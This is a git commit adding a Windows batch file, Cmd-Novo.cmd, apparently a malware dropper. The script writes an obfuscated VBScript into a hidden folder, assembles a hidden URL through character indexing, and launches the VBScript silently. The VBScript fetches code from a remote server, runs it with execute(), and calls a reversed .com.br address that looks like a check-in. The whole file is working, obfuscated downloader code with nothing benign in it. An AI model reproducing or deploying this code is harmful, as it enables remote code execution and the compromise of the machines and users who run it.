d3ff45de2776741c1198b4d633e8887b4c6ade2f
stiloxc <49726855+stiloxc@users.noreply.github.com>
2019-04-17 13:55:19 -0300

    Add files via upload

---
+++ Cmd-Novo.cmd
@@ -0,0 +1,39 @@
+@echo off
+setlocal EnableExtensions DisableDelayedExpansion
+md "%PUBLIC%\.qqqqqol\" && cls
+set jwvOeuR8=%USERNAME%.vbs
+set KLkQtnKH=rpt6mHoBcMIbn:9Y5GL.8eahRZxyij43l1swXNA/20uC=
+set i3KKVU3VM="%PUBLIC%\.qqqqqol\%jwvOeuR8%" ECHO
+del i3KKVU3VM="%PUBLIC%\.qqqqqol\%jwvOeuR8%
+:Fase1
+>>%i3KKVU3VM% Dim blkK12Ayu
+>>%i3KKVU3VM% Dim cnJzoIiigpY8QrN
+>>%i3KKVU3VM% Dim d0AqbwB
+>>%i3KKVU3VM% Dim eThvrwqA
+>>%i3KKVU3VM% Dim fPZfgwikwUAZTuj
+>>%i3KKVU3VM% Dim gjFm8MB
+>>%i3KKVU3VM% Dim hcljpm0ck1
+>>%i3KKVU3VM% cnJzoIiigpY8QrN = WScript.Arguments(0)
+>>%i3KKVU3VM% d0AqbwB = WScript.Arguments(1)
+>>%i3KKVU3VM% Set mLxfASBRXdobKnh = CreateObject(StrReverse("tcejbOmetsySeliF.gnitpircS"))
+>>%i3KKVU3VM% Set pIeLmbAMEjw0E8E = CreateObject(StrReverse("llehS.tpircSW"))
+>>%i3KKVU3VM% Dir = pIeLmbAMEjw0E8E.ExpandEnvironmentStrings("%USERPROFILE%")
+>>%i3KKVU3VM% If Not mLxfASBRXdobKnh.FolderExists(Dir + "\" + ".jAfEv") Then
+>>%i3KKVU3VM% Set n1py5K73AMH3a = mLxfASBRXdobKnh.CreateFolder(Dir + "\" + ".jAfEv")
+>>%i3KKVU3VM% Set blkK12Ayu = CreateObject(StrReverse("PTTHLMX.2LMXSM"))
+>>%i3KKVU3VM% blkK12Ayu.open StrReverse(cnJzoIiigpY8QrN), d0AqbwB, False
+>>%i3KKVU3VM% execute("blkK12Ayu.setRequestHeader ""User-Agent"", ""15M0yC9u5stom9U0se8r"":blkK12Ayu.setRequestHeader ""content-type"", ""application/x-www-form-urlencoded""")
+>>%i3KKVU3VM% execute("blkK12Ayu.send :eThvrwqA = blkK12Ayu.responseText")
+>>%i3KKVU3VM% execute( eThvrwqA )
+>>%i3KKVU3VM% WScript.Sleep(3000)
+>>%i3KKVU3VM% Set owoUa8m6LTFi5kk = CreateObject(StrReverse("PTTHLMXrevreS.2LMXSM"))
+>>%i3KKVU3VM% owoUa8m6LTFi5kk.open StrReverse("TEG"), StrReverse("php.tlum/rb.moc.sanacirema.atnocahnim//:sptth"), False
+>>%i3KKVU3VM% owoUa8m6LTFi5kk.send()
+>>%i3KKVU3VM% End If
+cls
+@echo off
+ping 127.0.0.1 -n 1 > nul
+set lDcS603edEPS=%KLkQtnKH:~23,1%%KLkQtnKH:~2,1%%KLkQtnKH:~2,1%%KLkQtnKH:~1,1%%KLkQtnKH:~34,1%%KLkQtnKH:~13,1%%KLkQtnKH:~39,1%%KLkQtnKH:~39,1%%KLkQtnKH:~12,1%%KLkQtnKH:~22,1%%KLkQtnKH:~12,1%%KLkQtnKH:~6,1%%KLkQtnKH:~35,1%%KLkQtnKH:~6,1%%KLkQtnKH:~1,1%%KLkQtnKH:~34,1%%KLkQtnKH:~28,1%%KLkQtnKH:~2,1%%KLkQtnKH:~21,1%%KLkQtnKH:~19,1%%KLkQtnKH:~8,1%%KLkQtnKH:~32,1%%KLkQtnKH:~42,1%%KLkQtnKH:~11,1%%KLkQtnKH:~39,1%%KLkQtnKH:~34,1%%KLkQtnKH:~22,1%%KLkQtnKH:~1,1%%KLkQtnKH:~34,1%%KLkQtnKH:~32,1%%KLkQtnKH:~39,1%%KLkQtnKH:~22,1%%KLkQtnKH:~5,1%%KLkQtnKH:~24,1%%KLkQtnKH:~41,1%%KLkQtnKH:~8,1%%KLkQtnKH:~5,1%%KLkQtnKH:~9,1%%KLkQtnKH:~3,1%%KLkQtnKH:~18,1%%KLkQtnKH:~27,1%%KLkQtnKH:~14,1%%KLkQtnKH:~30,1%%KLkQtnKH:~21,1%%KLkQtnKH:~36,1%%KLkQtnKH:~38,1%%KLkQtnKH:~42,1%%KLkQtnKH:~15,1%%KLkQtnKH:~36,1%%KLkQtnKH:~37,1%%KLkQtnKH:~30,1%%KLkQtnKH:~15,1%%KLkQtnKH:~36,1%%KLkQtnKH:~7,1%%KLkQtnKH:~32,1%%KLkQtnKH:~18,1%%KLkQtnKH:~12,1%%KLkQtnKH:~23,1%%KLkQtnKH:~16,1%%KLkQtnKH:~21,1%%KLkQtnKH:~28,1%%KLkQtnKH:~14,1%%KLkQtnKH:~33,1%%KLkQtnKH:~8,1%%KLkQtnKH:~5,1%%KLkQtnKH:~37,1%%KLkQtnKH:~29,1%%KLkQtnKH:~8,1%%KLkQtnKH:~4,1%%KLkQtnKH:~26,1%%KLkQtnKH:~0,1%%KLkQtnKH:~18,1%%KLkQtnKH:~40,1%%KLkQtnKH:~32,1%%KLkQtnKH:~42,1%%KLkQtnKH:~11,1%%KLkQtnKH:~17,1%%KLkQtnKH:~2,1%%KLkQtnKH:~33,1%%KLkQtnKH:~8,1%%KLkQtnKH:~43,1%%KLkQtnKH:~16,1%%KLkQtnKH:~35,1%%KLkQtnKH:~11,1%%KLkQtnKH:~4,1%%KLkQtnKH:~8,1%%KLkQtnKH:~4,1%%KLkQtnKH:~11,1%%KLkQtnKH:~4,1%%KLkQtnKH:~20,1%%KLkQtnKH:~2,1%%KLkQtnKH:~8,1%%KLkQtnKH:~17,1%%KLkQtnKH:~14,1%%KLkQtnKH:~31,1%%KLkQtnKH:~25,1%%KLkQtnKH:~36,1%%KLkQtnKH:~10,1%%KLkQtnKH:~44,1%
+start wscript //Nologo "%PUBLIC%\.qqqqqol\%jwvOeuR8%" AS111 %lDcS603edEPS% && @echo off
+endlocal
+:hY20fuAy6CvZMB
